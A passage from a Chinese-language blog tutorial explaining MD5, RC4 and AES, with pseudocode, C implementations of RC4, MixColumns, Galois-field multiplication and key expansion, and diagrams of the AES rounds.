class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">/Note: All variables are unsigned <span class="number">32</span> bits <span class="keyword">and</span> wrap modulo <span class="number">2</span>^<span class="number">32</span> when calculating</span><br><span class="line">var <span class="built_in">int</span>[<span class="number">64</span>] r, k</span><br><span class="line"></span><br><span class="line">//r specifies the per-<span class="built_in">round</span> shift amounts</span><br><span class="line">r[ <span class="number">0.</span><span class="number">.15</span>]：= &#123;<span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>,  <span class="number">7</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">22</span>&#125; </span><br><span class="line">r[<span class="number">16.</span><span class="number">.31</span>]：= &#123;<span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>,  <span class="number">5</span>,  <span class="number">9</span>, <span class="number">14</span>, <span class="number">20</span>&#125;</span><br><span class="line">r[<span class="number">32.</span><span class="number">.47</span>]：= &#123;<span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">23</span>&#125;</span><br><span class="line">r[<span class="number">48.</span><span class="number">.63</span>]：= &#123;<span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">21</span>&#125;</span><br><span class="line"></span><br><span class="line">//Use binary integer part of the sines of integers <span class="keyword">as</span> constants:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">    k[i] := floor(<span class="built_in">abs</span>(sin(i + <span class="number">1</span>)) × <span class="number">2</span>^<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">//Initialize variables:</span><br><span class="line">var <span class="built_in">int</span> h0 := <span class="number">0x67452301</span></span><br><span class="line">var <span class="built_in">int</span> h1 := <span class="number">0xEFCDAB89</span></span><br><span class="line">var <span class="built_in">int</span> h2 := <span class="number">0x98BADCFE</span></span><br><span class="line">var <span class="built_in">int</span> h3 := <span class="number">0x10325476</span></span><br><span class="line"></span><br><span class="line">//Pre-processing:</span><br><span class="line">append <span class="string">&quot;1&quot;</span> bit to message</span><br><span class="line">append <span class="string">&quot;0&quot;</span> bits until message length <span class="keyword">in</span> bits ≡ <span class="number">448</span> (mod <span class="number">512</span>)</span><br><span class="line">append bit length of message <span class="keyword">as</span> <span class="number">64</span>-bit little-endian integer to message</span><br><span class="line"></span><br><span class="line">//Process the message <span class="keyword">in</span> successive <span class="number">512</span>-bit chunks:</span><br><span class="line"><span class="keyword">for</span> each <span class="number">512</span>-bit chunk of message</span><br><span class="line">    <span class="keyword">break</span> chunk into sixteen <span class="number">32</span>-bit little-endian words w[i], <span class="number">0</span> ≤ i ≤ <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    //Initialize <span class="built_in">hash</span> value <span class="keyword">for</span> this chunk:</span><br><span class="line">    var <span class="built_in">int</span> a := h0</span><br><span class="line">    var <span class="built_in">int</span> b := h1</span><br><span class="line">    var <span class="built_in">int</span> c := h2</span><br><span class="line">    var <span class="built_in">int</span> d := h3</span><br><span class="line"></span><br><span class="line">    //Main loop:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">from</span> <span class="number">0</span> to <span class="number">63</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> ≤ i ≤ <span class="number">15</span> then</span><br><span class="line">            f := (b <span class="keyword">and</span> c) <span class="keyword">or</span> ((<span class="keyword">not</span> b) <span class="keyword">and</span> d)</span><br><span class="line">            g := i</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">16</span> ≤ i ≤ <span class="number">31</span></span><br><span class="line">            f := (d <span class="keyword">and</span> b) <span class="keyword">or</span> ((<span class="keyword">not</span> d) <span class="keyword">and</span> c)</span><br><span class="line">            g := (<span class="number">5</span>×i + <span class="number">1</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">32</span> ≤ i ≤ <span class="number">47</span></span><br><span class="line">            f := b xor c xor d</span><br><span class="line">            g := (<span class="number">3</span>×i + <span class="number">5</span>) mod <span class="number">16</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> <span class="number">48</span> ≤ i ≤ <span class="number">63</span></span><br><span class="line">            f := c xor (b <span class="keyword">or</span> (<span class="keyword">not</span> d))</span><br><span class="line">            g := (<span class="number">7</span>×i) mod <span class="number">16</span></span><br><span class="line"></span><br><span class="line">        temp := d</span><br><span class="line">        d := c</span><br><span class="line">        c := b</span><br><span class="line">        b := leftrotate((a + f + k[i] + w[g]),r[i]) + b</span><br><span class="line">        a := temp</span><br><span class="line">    Next i</span><br><span class="line">    //Add this chunk<span class="string">&#x27;s hash to result so far:</span></span><br><span class="line"><span class="string">    h0 := h0 + a</span></span><br><span class="line"><span class="string">    h1 := h1 + b </span></span><br><span class="line"><span class="string">    h2 := h2 + c</span></span><br><span class="line"><span class="string">    h3 := h3 + d</span></span><br><span class="line"><span class="string">End ForEach</span></span><br><span class="line"><span class="string">var int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)</span></span><br></pre></td></tr></table></div></figure><p><strong>特征</strong></p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h0 = <span class="number">0x67452301</span>;</span><br><span class="line">h1 = <span class="number">0xefcdab89</span>;</span><br><span class="line">h2 = <span class="number">0x98badcfe</span>;</span><br><span class="line">h3 = <span class="number">0x10325476</span>;</span><br></pre></td></tr></table></div></figure><p><strong>攻击方法</strong></p><p>上网站碰撞</p>        <h2 id="RC4"   >          <a href="#RC4" class="heading-link"><i class="fas fa-link"></i></a><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h2>      <p>RC4是一种流加密算法，密钥长度可变，加解密使用相同的密钥，算是对称加密算法</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">rc4_init</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> <span class="comment">//初始化函数</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i =<span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> k[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">        j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rc4_crypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *s, <span class="type">unsigned</span> <span class="type">char</span> *Data, <span class="type">unsigned</span> <span class="type">long</span> Len)</span> <span class="comment">//加解密</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//每收到一个字节，就进行循环。通过一定的算法定位 S 盒中的一个元素，并与输入字节异或，得到 k。循环中还改变了 S 盒。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。</span></span><br></pre></td></tr></table></div></figure><p>RC4 主要包含三个流程</p><ul><li>初始化 S 和 T 数组。</li><li>初始化置换 S。</li><li>生成密钥流。</li></ul><p>初始化S,T数组</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++) &#123;</span><br><span class="line">        s[i] = i;</span><br><span class="line">        k[i] = key[i%Len];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></div></figure><p>置换</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++) &#123;</span><br><span class="line">       j=(j+s[i]+k[i])%<span class="number">256</span>;</span><br><span class="line">       tmp = s[i];</span><br><span class="line">       s[i] = s[j]; <span class="comment">//交换s[i]和s[j]</span></span><br><span class="line">       s[j] = tmp;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></div></figure><p>生成流密钥，并处理Data</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;Len;k++) &#123;</span><br><span class="line">        i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">        j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line">        tmp = s[i];</span><br><span class="line">        s[i] = s[j]; <span class="comment">//交换s[x]和s[y]</span></span><br><span class="line">        s[j] = tmp;</span><br><span class="line">        t=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line">        Data[k] ^= s[t];</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></div></figure><p>由于异或运算的对合性，RC4 加密解密使用同一套算法</p>        <h2 id="RSA"   >          <a href="#RSA" class="heading-link"><i class="fas fa-link"></i></a><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2>              <h2 id="AES"   >          <a href="#AES" class="heading-link"><i class="fas fa-link"></i></a><a href="#AES" class="headerlink" title="AES"></a>AES</h2>      <p><strong>高级加密标准</strong>（英语：<strong>A</strong>dvanced <strong>E</strong>ncryption <strong>S</strong>tandard，缩写AES)，在密码学中又称<strong>Rijndael加密法</strong>，是美国联邦政府采用的一种区块加密标准。这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用。经过五年的甄选流程，高级加密标准由美国国家标准与技术研究院（NIST）于2001年11月26日发布于FIPS PUB 197，并在2002年5月26日成为有效的标准。2006年，高级加密标准已然成为对称密钥加密中最流行的算法之一。</p><p>对称加密，即加密与解密用的是同一套密钥</p><p>AES算法主要有四种操作处理，分别是密钥加法层(也叫轮密钥加，英文Add Round Key)、字节代换层(SubByte)、行位移层(Shift Rows)、列混淆层(Mix Column)。而明文x和密钥k都是由16个字节组成的数据(当然密钥还支持192位和256位的长度，暂时不考虑)，它是按照字节的先后顺序从上到下、从左到右进行排列的。而加密出的密文读取顺序也是按照这个顺序读取的，相当于将数组还原成字符串的模样了，然后再解密的时候又是按照4·4数组处理的。</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132157073.png" alt="image-20230113215739982" style="zoom:67%;" />        <h3 id="密钥加法层"   >          <a href="#密钥加法层" class="heading-link"><i class="fas fa-link"></i></a><a href="#密钥加法层" class="headerlink" title="密钥加法层"></a><strong>密钥加法层</strong></h3>      <p>在密钥加法层中有两个输入的参数，分别是明文和子密钥k[0]，而且这两个输入都是128位的。k[0]实际上就等同于密钥k。</p><p>在扩展域中加减法操作和异或运算等价，将两个输入的数据进行按字节异或操作就会得到运算的结果。</p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132157867.png" alt="image-20230113215747826" style="zoom:67%;" />        <h3 id="字节代换层"   >          <a href="#字节代换层" class="heading-link"><i class="fas fa-link"></i></a><a href="#字节代换层" class="headerlink" title="字节代换层"></a><strong>字节代换层</strong></h3>      <p>字节代换层的主要功能就是让输入的数据通过S_box表完成从一个字节到另一个字节的映射，这里的S_box表是通过某种方法计算出来的，具体的计算方法将在进阶部分进行介绍，我们基础部分就只给出计算好的S_box结果。S_box表是一个拥有256个字节元素的数组，可以将其定义为一维数组，也可以将其定义为16·16的二维数组，如果将其定义为二维数组，读取S_box数据的方法就是要将输入数据的每个字节的高四位作为第一个下标，第四位作为第二个下标，略有点麻烦。这里建议将其视作一维数组即可。逆S盒与S盒对应，用于解密时对数据处理，我们对解密时的程序处理称作逆字节代换，只是使用的代换表盒加密时不同而已。</p><p><strong>S盒</strong></p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132157153.png" alt="image-20230113215757069" style="zoom:67%;" /><p><strong>逆S盒</strong></p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132158837.png" alt="image-20230113215834759" style="zoom:67%;" /><p><strong>加密图示：</strong></p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132158201.png" alt="image-20230113215847153" style="zoom:67%;" />        <h3 id="行位移——ShiftRows"   >          <a href="#行位移——ShiftRows" class="heading-link"><i class="fas fa-link"></i></a><a href="#行位移——ShiftRows" class="headerlink" title="行位移——ShiftRows"></a><strong>行位移——ShiftRows</strong></h3>      <p>行位移操作最为简单，它是用来将输入数据作为一个4·4的字节矩阵进行处理的，然后将这个矩阵的字节进行位置上的置换。ShiftRows子层属于AES手动的扩散层，目的是将单个位上的变换扩散到影响整个状态当，从而达到雪崩效应。在加密时行位移处理与解密时的处理相反，我们这里将解密时的处理称作逆行位移。它之所以称作行位移，是因为它只在4·4矩阵的行间进行操作，每行4字节的数据。在加密时，保持矩阵的第一行不变，第二行向左移动8Bit(一个字节)、第三行向左移动2个字节、第四行向左移动3个字节。而在解密时恰恰相反，依然保持第一行不变，将第二行向右移动一个字节、第三行右移2个字节、第四行右移3个字节。操作结束！</p><p><strong>正向行位移图解:</strong></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132158518.png" alt="image-20230112180329630"></p><p><strong>逆向行位移图解:</strong></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132158193.png" alt="image-20230112180335419"></p>        <h3 id="列混淆——MixColumn"   >          <a href="#列混淆——MixColumn" class="heading-link"><i class="fas fa-link"></i></a><a href="#列混淆——MixColumn" class="headerlink" title="列混淆——MixColumn"></a><strong>列混淆——MixColumn</strong></h3>      <p>列混淆子层是AES算法中最为复杂的部分，属于扩散层，列混淆操作是AES算法中主要的扩散元素，它混淆了输入矩阵的每一列，使输入的每个字节都会影响到4个输出字节。行位移子层和列混淆子层的组合使得经过三轮处理以后，矩阵的每个字节都依赖于16个明文字节成可能。其中包含了矩阵乘法、伽罗瓦域内加法和乘法的相关知识。</p><p>在加密的正向列混淆中，我们要将输入的4·4矩阵左乘一个给定的4·4矩阵。而它们之间的加法、乘法都在扩展域GF(2^8)中进行。</p><p><strong>列混淆的代码</strong></p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> MixArray[<span class="number">4</span>][<span class="number">4</span>] = &#123;</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">MixColum</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>(*PlainArray)[<span class="number">4</span>])</span>`</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//定义变量</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> ArrayTemp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">    <span class="comment">//初始化变量</span></span><br><span class="line">    <span class="built_in">memcpy</span>(ArrayTemp, PlainArray, <span class="number">16</span>);</span><br><span class="line">    <span class="comment">//矩阵乘法4*4</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            PlainArray[i][j] = <span class="built_in">GaloisMultiplication</span>(MixArray[i][<span class="number">0</span>], ArrayTemp[<span class="number">0</span>][j]) ^</span><br><span class="line">                               <span class="built_in">GaloisMultiplication</span>(MixArray[i][<span class="number">1</span>], ArrayTemp[<span class="number">1</span>][j]) ^</span><br><span class="line">                               <span class="built_in">GaloisMultiplication</span>(MixArray[i][<span class="number">2</span>], ArrayTemp[<span class="number">2</span>][j]) ^</span><br><span class="line">                               <span class="built_in">GaloisMultiplication</span>(MixArray[i][<span class="number">3</span>], ArrayTemp[<span class="number">3</span>][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>我们发现在矩阵乘法中，出现了加法和乘法运算，在扩展域中加法操作等同于异或运算，而乘法操作需要一个特殊的方式进行处理，于是我们就先把代码中的加号换成异或符号，然后将伽罗瓦域的乘法定义成一个有两个参数的函数，并让他返回最后计算结果。于是列混淆的代码就会变成下面的样子：</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///////////////////////////////////////////////////////////////`</span></span><br><span class="line"><span class="comment">//功能: 伽罗瓦域内的乘法运算 GF(128)</span></span><br><span class="line"><span class="comment">//参数: Num_L 输入的左参数</span></span><br><span class="line"><span class="comment">//Num_R 输入的右参数</span></span><br><span class="line"><span class="comment">//返回值:计算结果</span></span><br><span class="line"><span class="function"><span class="type">char</span> <span class="title">GaloisMultiplication</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> Num_L, <span class="type">unsigned</span> <span class="type">char</span> Num_R)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//定义变量</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Result = <span class="number">0</span>; <span class="comment">//伽罗瓦域内乘法计算的结果</span></span><br><span class="line">    <span class="keyword">while</span>(Num_L)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//如果Num_L最低位是1就异或Num_R，相当于加上Num_R * 1</span></span><br><span class="line">        <span class="keyword">if</span>(Num_L &amp; <span class="number">0x01</span>)</span><br><span class="line">        &#123;</span><br><span class="line">        Result ^= Num_R;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Num_L右移一位，相当于除以2</span></span><br><span class="line">        Num_L = Num_L &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//如果Num_R最高位为1</span></span><br><span class="line">        <span class="keyword">if</span>(Num_R &amp; <span class="number">0x80</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//左移一位相当于乘二</span></span><br><span class="line">            Num_R = Num_R &lt;&lt; <span class="number">1</span>;<span class="comment">//注：这里会丢失最高位，但是不用担心</span></span><br><span class="line">            Num_R ^= <span class="number">0x1B</span>;<span class="comment">//计算伽罗瓦域内除法Num_R = Num_R/(x^8(刚好丢失最高位) +x^4+x^3+x^1+1)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//左移一位相当于乘二</span></span><br><span class="line">            Num_R = Num_R &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>在解密的逆向列混淆中与正向列混淆的不同之处在于使用的左乘矩阵不同，它与正向列混淆的左乘矩阵互为逆矩阵，也就是说，数据矩阵同时左乘这两个矩阵后，数据矩阵不会发生任何变化。</p><p><strong>正向列混淆处理</strong></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159155.png" alt="image-20230112180340278"></p><p><strong>逆向列混淆</strong></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159055.png" alt="image-20230112180343155"></p><p><strong>加解密验证</strong></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159602.png" alt="image-20230112180345575"></p>        <h3 id="AES密钥生成"   >          <a href="#AES密钥生成" class="heading-link"><i class="fas fa-link"></i></a><a href="#AES密钥生成" class="headerlink" title="AES密钥生成"></a><strong>AES密钥生成</strong></h3>      <p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159843.png" alt="image-20230112180348716"></p><p>子密钥的生成是以列为单位进行的，一列是32Bit，四列组成子密钥共128Bit。生成子密钥的数量比AES算法的轮数多一个，因为第一个密钥加法层进行密钥漂白时也需要子密钥。密钥漂白是指在AES的输入盒输出中都使用的子密钥的XOR加法。子密钥在图中都存储在W[0]、W[1]、…、W[43]的扩展密钥数组之中。k1-k16表示原始密钥对应的字节，而图中子密钥k0与原始子密钥相同。在生成的扩展密钥中W的下标如果是4的倍数时(从零开始)需要对异或的参数进行G函数处理。扩展密钥生成有关公式如下：</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>&lt;= i &lt;= <span class="number">10</span></span><br><span class="line"><span class="number">1</span>&lt;= j &lt;= <span class="number">3</span></span><br><span class="line">w[<span class="number">4</span>i] = W[<span class="number">4</span>(i<span class="number">-1</span>)] + G(W[<span class="number">4</span>i<span class="number">-1</span>]);</span><br><span class="line">w[<span class="number">4</span>i+j] = W[<span class="number">4</span>(i<span class="number">-1</span>)+j] + W[<span class="number">4</span>i<span class="number">-1</span>+j];</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132159046.png" alt="image-20230112180352632"></p><p>函数G()首先将4个输入字节进行翻转，并执行一个按字节的S盒代换，最后用第一个字节与轮系数Rcon进行异或运算。轮系数是一个有10个元素的一维数组，一个元素1个字节。G()函数存在的目的有两个，一是增加密钥编排中的非线性；二是消除AES中的对称性。这两种属性都是抵抗某些分组密码攻击必要的。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132225728.png" alt="image-20230112180356998"></p><p>生成密钥代码:</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用于密钥扩展 Rcon[0]作为填充，没有实际用途</span></span><br><span class="line"><span class="type">const</span> <span class="type">unsigned</span> <span class="type">int</span> Rcon[<span class="number">11</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span> &#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Key_S_Substitution</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>(*ExtendKeyArray)[<span class="number">44</span>], <span class="type">unsigned</span> <span class="type">int</span> nCol)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">    ExtendKeyArray[i][nCol] = S_Table[(ExtendKeyArray[i][nCol]) &gt;&gt; <span class="number">4</span>][(ExtendKeyArray[i][nCol]) &amp; <span class="number">0x0F</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span 